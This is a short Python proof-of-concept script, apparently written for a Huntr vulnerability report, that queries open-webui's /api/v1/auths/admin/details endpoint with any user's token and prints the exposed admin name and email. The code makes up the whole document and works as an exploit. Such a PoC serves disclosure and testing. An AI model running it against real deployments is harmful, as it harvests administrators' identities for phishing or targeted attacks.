#!/usr/bin/env python3
"""
PoC: Admin Information Disclosure in open-webui/open-webui
Huntr Report: c543e137-449e-48ac-a899-ab89f34ec307
Target: https://github.com/open-webui/open-webui

Vulnerability: The /api/v1/auths/admin/details endpoint exposes admin email and name
when SHOW_ADMIN_DETAILS config flag is enabled (default: true).

Setup:
  1. Run open-webui (docker or local)
  2. Run this PoC with any authenticated user token

Usage:
  python3 poc_openwebui_admin_disclosure.py --target http://localhost:8080 --token YOUR_TOKEN
"""

import argparse
import requests
import sys


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:8080")
    parser.add_argument("--token", required=True, help="Any authenticated user's API token")
    args = parser.parse_args()

    print(f"[*] Target: {args.target}")
    print(f"[*] Testing admin information disclosure...")

    headers = {"Authorization": f"Bearer {args.token}"}

    # Test the admin details endpoint
    print("\n[*] Request: GET /api/v1/auths/admin/details")
    try:
        r = requests.get(
            f"{args.target}/api/v1/auths/admin/details",
            headers=headers,
            timeout=10,
        )
        print(f"  Status: {r.status_code}")
        print(f"  Response: {r.text}")

        if r.status_code == 200:
            data = r.json()
            name = data.get("name", "N/A")
            email = data.get("email", "N/A")
            print(f"\n  Admin Name: {name}")
            print(f"  Admin Email: {email}")

            if email and email != "N/A":
                print(f"\n  [+] VULNERABILITY CONFIRMED — admin details exposed!")
                print(f"      Any authenticated user can discover admin identity")
            else:
                print(f"\n  [?] Endpoint returned data but no admin info — SHOW_ADMIN_DETAILS may be false")
        elif r.status_code == 400:
            print(f"  [-] Endpoint disabled (SHOW_ADMIN_DETAILS=false)")
        elif r.status_code == 401:
            print(f"  [-] Authentication required")

    except Exception as e:
        print(f"  [!] Error: {e}")


if __name__ == "__main__":
    main()
